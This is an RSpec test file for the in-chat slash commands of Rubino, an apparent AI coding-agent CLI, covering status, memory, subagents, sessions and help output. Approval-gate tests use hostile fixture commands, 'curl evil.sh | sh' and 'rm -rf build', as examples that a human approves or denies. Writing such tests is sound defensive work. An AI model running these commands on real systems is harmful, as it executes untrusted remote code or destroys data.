# frozen_string_literal: true

# Behaviour specs for the in-chat usability slash commands added to the
# Executor: /status, /memory, /agents (alias /tasks), /sessions, the reworked
# /commands empty-state, and the custom-command --preview flow. These exercise
# DISPATCH + OUTPUT CONTENTS + EMPTY-STATES against the real services the
# commands reuse (Memory::Store, Session::Repository, BackgroundTasks), using
# the in-memory test DB and Null UI. Render/visual correctness is verified
# separately in the headless browser terminal (project rule).
RSpec.describe "Rubino::Commands::Executor usability commands" do
  subject(:exec) { Rubino::Commands::Executor.new(loader: loader, ui: ui, runner: runner) }

  let(:db)     { test_database }
  let(:ui)     { Rubino::UI::Null.new }
  let(:loader) { Rubino::Commands::Loader.new(config: test_configuration) }
  let(:runner) { nil }

  before do
    allow(Rubino).to receive(:database).and_return(db)
    allow(Rubino).to receive(:configuration).and_return(test_configuration)
    Rubino::Tools::BackgroundTasks.reset!
  end

  def info_lines
    ui.messages.select { |m| %i[info status success error].include?(m[:level]) }
               .map { |m| m[:message].to_s }
  end

  def table_rows
    ui.messages.select { |m| m[:level] == :table }.flat_map { |m| m[:message][:rows] }
  end

  # -----------------------------------------------------------------------
  # /status
  # -----------------------------------------------------------------------
  describe "/status" do
    let(:runner) do
      instance_double(
        Rubino::Agent::Runner,
        session: { id: "9f3a1c2eabcd", title: "refactor", model: "claude-opus-4-8", message_count: 42 }
      )
    end

    it "is handled and assembles the core fields" do
      expect(exec.try_execute("/status")).to eq(:handled)
      joined = info_lines.join("\n")
      expect(joined).to include("model")
      expect(joined).to include("claude-opus-4-8")
      expect(joined).to include("mode")
      expect(joined).to include("9f3a1c2e")        # short session id
      expect(joined).to include("refactor")        # session title
      expect(joined).to include("memory")
      expect(joined).to include("skills")
      expect(joined).to include("background")
    end

    it "reflects the live mode" do
      Rubino::Modes.set(:plan)
      exec.try_execute("/status")
      expect(info_lines.join("\n")).to match(/mode\s+plan/)
    end

    it "reports the memory fact count from the store" do
      Rubino::Memory::Store.new(db: db.db).create(kind: "fact", content: "the sky is blue")
      exec.try_execute("/status")
      expect(info_lines.join("\n")).to include("1 facts")
    end

    it "counts running background subagents" do
      reg = Rubino::Tools::BackgroundTasks.instance
      reg.reserve(subagent: "explore", prompt: "find sessions")
      exec.try_execute("/status")
      expect(info_lines.join("\n")).to include("1 running")
    end

    it "degrades gracefully with no live runner" do
      Rubino::Commands::Executor.new(loader: loader, ui: ui, runner: nil).try_execute("/status")
      expect(info_lines.join("\n")).to include("(none)")
    end

    it "welcome renders without a runner and never raises" do
      expect do
        Rubino::Commands::Executor.welcome(runner: nil, ui: ui)
      end.not_to raise_error
      expect(info_lines.join("\n")).to include("rubino")
    end

    # #82: /status is the at-a-glance STATE panel — it earns its place with
    # the things a status check wants beyond the boot header.
    it "adds approval-policy, provider, and tool-roster lines (#82)" do
      exec.try_execute("/status")
      joined = info_lines.join("\n")
      expect(joined).to match(/approvals\s+/)
      expect(joined).to match(/provider\s+/)
      expect(joined).to match(/tools\s+/)
    end

    it "reflects the approval policy for the live mode (#82)" do
      Rubino::Modes.set(:yolo)
      exec.try_execute("/status")
      expect(info_lines.join("\n")).to match(/approvals\s+skipped/)
    end

    # #82: welcome and /status must NOT render the same block. Welcome is
    # guidance ("try: …"); /status is the state grid (approvals/tools).
    it "welcome and /status are NOT identical blocks (#82)" do
      Rubino::Commands::Executor.welcome(runner: runner, ui: ui)
      welcome = info_lines.join("\n")
      ui.reset!
      exec.try_execute("/status")
      status = info_lines.join("\n")

      expect(welcome).not_to eq(status)
      # Welcome orients ("try:"); /status does not repeat the onboarding hints.
      expect(welcome.downcase).to include("try:")
      expect(status).to match(/approvals\s+/)
      expect(status).not_to include("try:")
      # Welcome does not dump the state grid.
      expect(welcome).not_to match(/approvals\s+/)
    end
  end

  # -----------------------------------------------------------------------
  # /memory
  # -----------------------------------------------------------------------
  # Regression for #106: the in-chat `/memory` handler must read/write the SAME
  # active backend the agent loop, the `rubino memory` CLI (#94) and the
  # HTTP /v1/memory ops use (the configured sqlite tiny-Zep backend), not the
  # legacy `:memories` table that `Memory::Store` is hardwired to. Facts stored
  # through the active backend must be visible to `/memory` / `/memory <query>`
  # and removable by `/memory forget`.
  describe "/memory" do
    # The active sqlite backend, pinned to the same in-memory test DB the
    # executor resolves via Memory::Backends.build — i.e. in-chat /memory and
    # the CLI/agent now share ONE store.
    let(:store) { Rubino::Memory::Backends::Sqlite.new(config: test_configuration, db: db.db) }

    before do
      allow(Rubino::Memory::Backends).to receive(:build).and_return(store)
      # The in-chat handler must NOT touch the legacy store anymore.
      allow(Rubino::Memory::Store).to receive(:new)
        .and_raise("/memory must use the active backend, not Memory::Store")
    end

    it "shows an empty-state when nothing is stored" do
      expect(exec.try_execute("/memory")).to eq(:handled)
      expect(info_lines.join("\n")).to include("No facts stored yet")
    end

    it "lists recent facts in a table" do
      store.store(kind: "preference", content: "no claude attribution in commits")
      exec.try_execute("/memory")
      contents = table_rows.flatten.join(" ")
      expect(contents).to include("preference")
      expect(contents).to include("no claude attribution")
    end

    it "searches facts by substring" do
      store.store(kind: "fact", content: "postgres core ported to ruby")
      store.store(kind: "fact", content: "the deploy uses capistrano")
      exec.try_execute("/memory postgres")
      joined = info_lines.join("\n")
      expect(joined).to include("postgres core")
      expect(joined).not_to include("capistrano")
    end

    it "shows the matched fact's content in full (no mid-sentence truncation) — #85" do
      long = "The app uses Stripe for payments; webhooks reconcile the invoice " \
             "state nightly so a missed event never leaves an order stuck."
      store.store(kind: "technical_decision", content: long)
      exec.try_execute("/memory payments")
      joined = info_lines.join("\n").gsub(/\s+/, " ")
      # The interesting tail the list-view truncation used to hide must be present.
      expect(joined).to include("reconcile the invoice")
      expect(joined).to include("order stuck")
      expect(joined).not_to include("…")
    end

    it "prints a result-count header for a search — #85" do
      store.store(kind: "fact", content: "alpha note")
      store.store(kind: "fact", content: "alpha and beta")
      exec.try_execute("/memory alpha")
      expect(info_lines.join("\n")).to include('2 matches for "alpha"')
    end

    it "reports no matches for an unknown search" do
      store.store(kind: "fact", content: "something")
      exec.try_execute("/memory nonexistent_xyz")
      expect(info_lines.join("\n")).to include("No facts matching")
    end

    it "forgets a fact by id" do
      m = store.store(kind: "fact", content: "delete me")
      exec.try_execute("/memory forget #{m[:id]}")
      expect(store.find(m[:id])).to be_nil
      expect(info_lines.join("\n")).to include("Forgot")
    end

    it "errors when forgetting an unknown id" do
      exec.try_execute("/memory forget deadbeef")
      errors = ui.messages.select { |m| m[:level] == :error }.map { |m| m[:message] }
      expect(errors.join("\n")).to include("No fact with id")
    end

    it "prints a usage hint for 'forget' with no id (not a search)" do
      exec.try_execute("/memory forget")
      joined = info_lines.join("\n")
      expect(joined).to include("Usage: /memory forget <id>")
      expect(joined).not_to include("No facts matching")
    end

    it "prints a usage hint for 'forget' with multiple tokens (not a search)" do
      exec.try_execute("/memory forget aa bb")
      joined = info_lines.join("\n")
      expect(joined).to include("Usage: /memory forget <id>")
      expect(joined).not_to include("No facts matching")
    end
  end

  # -----------------------------------------------------------------------
  # /agents (alias /tasks)
  # -----------------------------------------------------------------------
  describe "/agents" do
    let(:reg) { Rubino::Tools::BackgroundTasks.instance }

    # The real UI::CLI #info/#table are puts-based and return nil. The Null
    # adapter, however, returns the messages array (truthy) from those methods,
    # which masked #34: when the agents/tasks branch returned handle_agents's
    # value (nil) instead of :handled, try_execute treated the falsy result as
    # "not a built-in" and fell through to the unknown-command path — appending
    # a spurious "✗ Unknown command: /agents" + the Available list AFTER the
    # correct output (try_execute STILL returned :handled, because the
    # unknown-command branch itself returns :handled, so a return-value-only
    # assertion couldn't catch it). These cases force the puts-based reality
    # (record-then-return-nil) AND assert the spurious unknown-command output is
    # absent, so the spec fails if the branch ever stops returning :handled.
    def make_ui_return_nil(*methods)
      methods.each do |m|
        original = ui.method(m)
        allow(ui).to receive(m) do |*args, **kwargs|
          kwargs.empty? ? original.call(*args) : original.call(*args, **kwargs)
          nil
        end
      end
    end

    it "shows an empty-state when no subagents have run" do
      make_ui_return_nil(:info, :table, :error, :separator)
      expect(exec.try_execute("/agents")).to eq(:handled)
      expect(info_lines.join("\n")).to include("No background subagents")
      expect(info_lines.join("\n")).not_to include("Unknown command")
    end

    it "/tasks is an alias for /agents" do
      make_ui_return_nil(:info, :table, :error, :separator)
      expect(exec.try_execute("/tasks")).to eq(:handled)
      expect(info_lines.join("\n")).to include("No background subagents")
      expect(info_lines.join("\n")).not_to include("Unknown command")
    end

    it "lists subagents read from BackgroundTasks with status + label" do
      e = reg.reserve(subagent: "explore", prompt: "find where sessions are listed")
      exec.try_execute("/agents")
      cells = table_rows.flatten.join(" ")
      expect(cells).to include(e.id)
      expect(cells).to include("running")
      expect(cells).to include("explore")
    end

    it "drills into a running subagent with a live recent-activity snapshot (#71)" do
      e = reg.reserve(subagent: "explore", prompt: "do a thing")
      reg.record_tool_started(e.id, "read lib/foo.rb")
      reg.record_tool_finished(e.id, "✓ read · 120 lines")
      reg.record_tool_started(e.id, "grep current_user")
      exec.try_execute("/agents #{e.id}")
      text = info_lines.join("\n")
      # The drill-in tails the live registry ring, not just a "still running" stub.
      expect(text).to include("recent:")
      expect(text).to include("✓ read · 120 lines")
      expect(text).to include("grep current_user") # the live last_activity ● line
    end

    it "the list label uses the live last_activity to distinguish concurrent tasks (#127)" do
      a = reg.reserve(subagent: "explore", prompt: "Summarize the contents of lib/rubino")
      reg.record_tool_started(a.id, "read lib/rubino/tools/edit_tool.rb")
      exec.try_execute("/agents")
      cells = table_rows.flatten.join(" ")
      expect(cells).to include("read lib/rubino/tools/edit_tool.rb")
    end

    it "shows the result of a completed subagent" do
      e = reg.reserve(subagent: "explore", prompt: "do a thing")
      reg.complete(e, status: :completed, result: "found 3 files")
      exec.try_execute("/agents #{e.id}")
      expect(info_lines.join("\n")).to include("found 3 files")
    end

    it "shows the error of a failed subagent" do
      e = reg.reserve(subagent: "explore", prompt: "do a thing")
      reg.complete(e, status: :failed, error: "boom")
      exec.try_execute("/agents #{e.id}")
      errors = ui.messages.select { |m| m[:level] == :error }.map { |m| m[:message] }
      expect(errors.join("\n")).to include("boom")
    end

    it "errors on an unknown id" do
      exec.try_execute("/agents sa_unknown")
      errors = ui.messages.select { |m| m[:level] == :error }.map { |m| m[:message] }
      expect(errors.join("\n")).to include("No background subagent")
    end

    it "--stop cancels a running subagent via its runner CancelToken" do
      child = instance_double(Rubino::Agent::Runner)
      expect(child).to receive(:cancel!)
      e = reg.reserve(subagent: "explore", prompt: "x")
      reg.attach(e, thread: Thread.new {}, runner: child)
      exec.try_execute("/agents #{e.id} --stop")
      expect(info_lines.join("\n")).to include("Stop requested")
    end

    it "--stop on an already-finished subagent is a no-op message" do
      e = reg.reserve(subagent: "explore", prompt: "x")
      reg.complete(e, status: :completed, result: "done")
      exec.try_execute("/agents #{e.id} --stop")
      expect(info_lines.join("\n")).to include("already completed")
    end

    # #108: after a stop request the list must reflect it immediately —
    # showing plain "● running" right after "Stop requested" reads as if the
    # stop did nothing while the child unwinds at its next checkpoint.
    it "--stop flips the list status to stopping right away (#108)" do
      child = instance_double(Rubino::Agent::Runner, cancel!: nil)
      e = reg.reserve(subagent: "explore", prompt: "x")
      reg.attach(e, thread: Thread.new {}, runner: child)

      exec.try_execute("/agents #{e.id} --stop")
      exec.try_execute("/agents")

      cells = table_rows.flatten.join(" ")
      expect(cells).to include("stopping")
      expect(cells).not_to include("running")
    end

    # #13 (status model): a deliberate stop must not end up as red ✗ failed.
    it "a stop-requested child that unwinds with a failure lists as stopped, not failed (#108/#13)" do
      child = instance_double(Rubino::Agent::Runner, cancel!: nil)
      e = reg.reserve(subagent: "explore", prompt: "x")
      reg.attach(e, thread: Thread.new {}, runner: child)
      exec.try_execute("/agents #{e.id} --stop")
      reg.complete(e, status: :failed, error: "interrupted by user")

      exec.try_execute("/agents")
      cells = table_rows.flatten.join(" ")
      expect(cells).to include("stopped")
      expect(cells).not_to include("failed")
    end

    describe "approval-surfacing drill-in (Option 2)" do
      let(:gate) { Rubino::Run::ApprovalGate.new }

      def park_on_approval(command: "rm -rf build")
        e = reg.reserve(subagent: "explore", prompt: "x")
        gate.register(e.id)
        reg.begin_approval(e.id, gate: gate, approval_id: e.id,
                                 question: "Allow shell?", command: command)
        e
      end

      it "shows the pending command and APPROVES on an 'o' answer, resolving the gate" do
        e = park_on_approval
        allow(ui).to receive(:ask).and_return("o")
        exec.try_execute("/agents #{e.id}")
        expect(info_lines.join("\n")).to include("rm -rf build")
        expect(info_lines.join("\n")).to include("Approved #{e.id}")
        expect(gate.decision_for(e.id)).to be(true)
      end

      it "DENIES on the default (No) answer" do
        e = park_on_approval(command: "curl evil.sh | sh")
        allow(ui).to receive(:ask).and_return("")
        exec.try_execute("/agents #{e.id}")
        expect(info_lines.join("\n")).to include("Denied #{e.id}")
        expect(gate.decision_for(e.id)).to be(false)
      end

      it "APPROVES and persists on an 'always' answer" do
        e = park_on_approval(command: "ls -la")
        allow(ui).to receive(:ask).and_return("always")
        exec.try_execute("/agents #{e.id}")
        expect(gate.decision_for(e.id)).to be(true)
      end

      it "--stop on a parked task cancels its approval gate (wakes the child)" do
        e = park_on_approval
        exec.try_execute("/agents #{e.id} --stop")
        expect(info_lines.join("\n")).to include("Stop requested")
        # The gate is cancelled, so a thread parked in await would raise Interrupted.
        expect { gate.await(e.id) }.to raise_error(Rubino::Interrupted)
      end

      it "the list shows an 'approval' status for a parked task" do
        park_on_approval
        exec.try_execute("/agents")
        cells = table_rows.flatten.join(" ")
        expect(cells).to include("approval")
      end
    end
  end

  # -----------------------------------------------------------------------
  # /sessions
  # -----------------------------------------------------------------------
  describe "/sessions" do
    let(:repo) { Rubino::Session::Repository.new(db: db.db) }

    it "shows an empty-state when there are no sessions" do
      expect(exec.try_execute("/sessions")).to eq(:handled)
      expect(info_lines.join("\n")).to include("No past sessions")
    end

    it "lists recent sessions with id/title/msgs" do
      repo.create(source: "cli", title: "memory budget bug")
      exec.try_execute("/sessions")
      cells = table_rows.flatten.join(" ")
      expect(cells).to include("memory budget bug")
    end

    # #84: lead with the identifying fields so a narrow-term card fallback
    # scans well (ID/Title/Created first, not Msgs).
    it "orders the columns identifying-field-first (#84)" do
      repo.create(source: "cli", title: "ordered")
      exec.try_execute("/sessions")
      headers = ui.messages.find { |m| m[:level] == :table }[:message][:headers]
      expect(headers).to eq(%w[ID Title Created Status Msgs])
    end

    it "resumes by id and returns a resume signal the REPL acts on" do
      s = repo.create(source: "cli", title: "resume me")
      result = exec.try_execute("/sessions #{s[:id]}")
      expect(result).to be_a(Hash)
      expect(result[:resume_session_id]).to eq(s[:id])
      expect(info_lines.join("\n")).to include("Resuming")
    end

    it "resumes by title substring" do
      s = repo.create(source: "cli", title: "the auth refactor")
      result = exec.try_execute("/sessions auth refactor")
      expect(result[:resume_session_id]).to eq(s[:id])
    end

    it "errors when nothing matches" do
      result = exec.try_execute("/sessions nope_xyz")
      expect(result).to eq(:handled)
      errors = ui.messages.select { |m| m[:level] == :error }.map { |m| m[:message] }
      expect(errors.join("\n")).to include("No session matching")
    end

    it "surfaces an ambiguous match instead of guessing" do
      repo.create(source: "cli", title: "the parser bug")
      repo.create(source: "cli", title: "another parser bug")
      result = exec.try_execute("/sessions parser bug")
      expect(result).to eq(:handled)
      errors = ui.messages.select { |m| m[:level] == :error }.map { |m| m[:message] }
      expect(errors).not_to be_empty
    end

    # #145: bare /sessions offers an arrow-key picker (reusing @ui.select, the
    # same component the approval menu uses). Picking a row resumes it; off a
    # real terminal @ui.select returns nil and the static-table + shortcut path
    # runs (covered by the tests above with the Null UI).
    context "interactive picker (#145)" do
      it "resumes the session the user picks from the menu" do
        s1 = repo.create(source: "cli", title: "first")
        s2 = repo.create(source: "cli", title: "second")
        # Simulate the user highlighting + Enter on the second row.
        allow(ui).to receive(:select).and_return(s2[:id])

        result = exec.try_execute("/sessions")

        expect(result).to be_a(Hash)
        expect(result[:resume_session_id]).to eq(s2[:id])
        # The picker is offered over the listed sessions as [label, id] pairs.
        expect(ui).to have_received(:select) do |_prompt, choices|
          ids = choices.map(&:last)
          expect(ids).to include(s1[:id], s2[:id])
        end
      end

      it "falls back to the static table + shortcut when the picker is cancelled" do
        repo.create(source: "cli", title: "only")
        allow(ui).to receive(:select).and_return(nil) # Esc / non-TTY

        result = exec.try_execute("/sessions")

        expect(result).to eq(:handled)
        expect(info_lines.join("\n")).to include("/sessions <id|title>")
      end
    end
  end

  # -----------------------------------------------------------------------
  # /commands empty-state rework + --preview
  # -----------------------------------------------------------------------
  describe "/commands empty-state" do
    it "explains what a command is and shows a concrete example" do
      exec.try_execute("/commands")
      joined = info_lines.join("\n")
      expect(joined).to include("reusable prompts")
      expect(joined).to include("$ARGUMENTS")
      expect(joined).to include(".rubino/commands/review.md")
      expect(joined).to include("description:")
    end

    it "lists custom commands with their description when present" do
      dir = loader.send(:command_paths).first
      FileUtils.mkdir_p(File.expand_path(dir))
      File.write(File.join(File.expand_path(dir), "review.md"),
                 "---\ndescription: Review the diff\n---\nReview $ARGUMENTS")
      exec.try_execute("/commands")
      joined = info_lines.join("\n")
      expect(joined).to include("/review")
      expect(joined).to include("Review the diff")
    ensure
      FileUtils.rm_rf(File.expand_path(dir)) if dir
    end
  end

  describe "custom command --preview" do
    let(:tmp_dir) { Dir.mktmpdir("rubino_preview") }
    let(:loader)  { Rubino::Commands::Loader.new(config: test_configuration("commands" => { "paths" => [tmp_dir] })) }

    after { FileUtils.rm_rf(tmp_dir) }

    before do
      File.write(File.join(tmp_dir, "review.md"),
                 "---\ndescription: Review\n---\nReview the diff. $ARGUMENTS")
    end

    it "resolves and shows the prompt, then runs on confirmation" do
      allow(ui).to receive(:ask).and_return("y")
      result = exec.try_execute("/review --preview the auth change")
      expect(result).to be_a(Hash)
      expect(result[:prompt]).to eq("Review the diff. the auth change")
      expect(info_lines.join("\n")).to include("Review the diff. the auth change")
    end

    it "does NOT run when the user declines the preview" do
      allow(ui).to receive(:ask).and_return("n")
      result = exec.try_execute("/review --preview something")
      expect(result).to eq(:handled)
    end

    it "strips --preview from the rendered arguments" do
      allow(ui).to receive(:ask).and_return("y")
      result = exec.try_execute("/review --preview keep this")
      expect(result[:prompt]).not_to include("--preview")
      expect(result[:prompt]).to include("keep this")
    end

    it "runs directly (no preview) without --preview" do
      result = exec.try_execute("/review just go")
      expect(result).to be_a(Hash)
      expect(result[:prompt]).to eq("Review the diff. just go")
    end
  end

  # -----------------------------------------------------------------------
  # /help — de-dup + keys reference (#87)
  # -----------------------------------------------------------------------
  describe "/help" do
    it "is handled" do
      expect(exec.try_execute("/help")).to eq(:handled)
    end

    it "combines /exit and /quit into a single row (#87)" do
      exec.try_execute("/help")
      joined = info_lines.join("\n")
      # One combined row, not two identical "End session" rows.
      expect(joined).to include("/exit, /quit")
      expect(joined.scan("- End session").size).to eq(1)
    end

    it "lists /paste and /clear-images exactly once (#87)" do
      exec.try_execute("/help")
      joined = info_lines.join("\n")
      expect(joined.scan(%r{/paste\b}).size).to eq(1)
      expect(joined.scan(%r{/clear-images\b}).size).to eq(1)
    end

    it "has no duplicate built-in rows at all (#87)" do
      exec.try_execute("/help")
      # Rows look like "  /name  - desc"; no /name should appear on two rows.
      names = info_lines.join("\n").scan(%r{^\s+(/[\w-]+(?:, /[\w-]+)?)\s+-\s}).flatten
                        .flat_map { |r| r.split(", ") }
      expect(names).to eq(names.uniq)
    end

    it "documents the key/shortcut vocabulary (#87)" do
      exec.try_execute("/help")
      joined = info_lines.join("\n")
      expect(joined).to include("Keys:")
      expect(joined).to include("↑/↓")
      expect(joined).to include("Enter")
      expect(joined).to include("Ctrl-C")
      expect(joined).to include("Tab")
    end
  end

  # -----------------------------------------------------------------------
  # status glyph spacing (#86)
  # -----------------------------------------------------------------------
  describe "agent status glyphs (#86)" do
    let(:reg) { Rubino::Tools::BackgroundTasks.instance }

    it "puts a space between the glyph and the word (not glued)" do
      reg.reserve(subagent: "explore", prompt: "x")
      exec.try_execute("/agents")
      cell = table_rows.flatten.map(&:to_s).find { |c| c.include?("running") }
      plain = cell.gsub(/\e\[[0-9;]*m/, "")
      expect(plain).to include("● running")
      expect(plain).not_to include("●running")
    end
  end
end
